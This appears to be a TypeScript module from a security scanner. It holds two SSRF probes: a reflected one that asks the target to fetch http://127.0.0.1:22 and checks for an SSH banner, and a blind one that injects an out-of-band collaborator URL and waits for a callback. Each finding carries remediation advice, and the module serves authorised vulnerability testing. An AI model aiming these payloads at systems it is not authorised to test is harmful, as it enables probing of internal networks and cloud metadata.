// SSRF red-team probes: reflected (an internal loopback banner echoed inline)
// and blind out-of-band (the target calls back a unique collaborator URL). Each
// returns a PROVEN finding or null and swallows its own errors.
import type { OobCollaborator } from "./oob.js";
import { safeFetch } from "./ssrf.js";
import { buildProbeEvidence, buildOobEvidence } from "./evidence.js";

type Headers = Record<string, string>;

export async function probeSsrfReflected(url: string, fuzzHeaders: Headers): Promise<any | null> {
  try {
    const ssrfCtl = new AbortController();
    const ssrfId = setTimeout(() => ssrfCtl.abort(), 4000);
    const ssrfRes = await safeFetch(`${url}/?url=http://127.0.0.1:22`, { headers: fuzzHeaders, signal: ssrfCtl.signal });
    clearTimeout(ssrfId);
    const ssrfText = await ssrfRes.text();
    // The signal is internal-only content the public target could not otherwise
    // return: an SSH banner from the loopback interface. Quote the exact banner
    // so the proof is the leaked internal data itself, not merely a boolean.
    const ssrfMatch = /SSH-2\.0-\S+|Protocol mismatch\.?/.exec(ssrfText);
    if (!ssrfMatch) return null;
    const ssrfUrl = `${url}/?url=http://127.0.0.1:22`;
    return {
      testName: "Active Server-Side Request Forgery (SSRF)",
      payload: "http://127.0.0.1:22",
      severity: "critical",
      description:
        "Active Red Team scanning identified an insecure proxy/fetch behavior that permitted requests returning local loopback (SSH) banner data, confirming an SSRF vulnerability.",
      fix: "Enforce strict network path isolation for backend fetches. Implement allow-listing filters and block internal Class A/B/C IP architectures.",
      evidence: buildProbeEvidence({
        method: "oracle", attackUrl: ssrfUrl, requestHeaders: fuzzHeaders, res: ssrfRes, body: ssrfText,
        matchIndex: ssrfMatch.index, quote: ssrfMatch[0],
        why: "This is an SSH service banner from 127.0.0.1 — the target's own loopback interface, unreachable from the public internet. Its presence in the response means the server fetched an attacker-chosen internal address on our behalf.",
        demonstration: `We asked the app to fetch "http://127.0.0.1:22" (its own internal loopback), and the response came back carrying "${ssrfMatch[0]}" — an internal SSH banner a public visitor can never reach. That proves the server can be steered to make requests to internal systems.`,
      }),
    };
  } catch { return null; }
}

// Blind out-of-band SSRF: reflection only catches SSRF that echoes internal
// content inline; this catches the blind case by injecting a unique collaborator
// URL and watching for the target to call it. A recorded callback is the proof.
export async function probeBlindSsrf(
  url: string,
  fuzzHeaders: Headers,
  oob: OobCollaborator,
  scanId?: string,
): Promise<any | null> {
  try {
    const probe = oob.issue(scanId);
    const oobAttackUrl = `${url}/?url=${encodeURIComponent(probe.url)}`;
    const oobCtl = new AbortController();
    const oobId = setTimeout(() => oobCtl.abort(), 4000);
    try {
      // Fire the trigger: ask the target to fetch our collaborator URL.
      await safeFetch(oobAttackUrl, { headers: fuzzHeaders, signal: oobCtl.signal });
    } catch {
      /* the target may not respond to us directly — the callback is the proof */
    } finally {
      clearTimeout(oobId);
    }
    // Wait a bounded window for the target to reach our collaborator.
    const event = await oob.poll(probe.token, 8000);
    if (!event) return null;
    return {
      testName: "Blind Server-Side Request Forgery (out-of-band)",
      payload: probe.url,
      severity: "critical",
      description:
        "The target fetched a unique Seclayer collaborator URL supplied in the \"url\" parameter, reaching our out-of-band listener from its own infrastructure. This proves the server makes attacker-controlled outbound requests even though nothing is reflected in its response — a blind SSRF that can be aimed at internal services or cloud metadata.",
      fix: "Do not fetch user-supplied URLs directly. Enforce an allow-list of permitted hosts, resolve and validate the destination IP (blocking loopback/link-local/RFC1918/metadata ranges), and disable redirects to internal addresses.",
      evidence: buildOobEvidence({
        attackUrl: oobAttackUrl, requestHeaders: fuzzHeaders, callbackUrl: probe.url, token: probe.token, event,
        why: "This is our collaborator's record of the target calling the unique, unguessable URL we injected. Only a server that fetched our payload URL could produce this callback — a public visitor cannot forge it.",
        demonstration: `We put a one-time Seclayer URL in the "url" parameter, and moments later the target itself connected to that URL from ${event.sourceIp}. That callback — carrying our unique token — proves the server made a request we controlled, without leaking anything in its own response.`,
      }),
    };
  } catch { return null; }
}
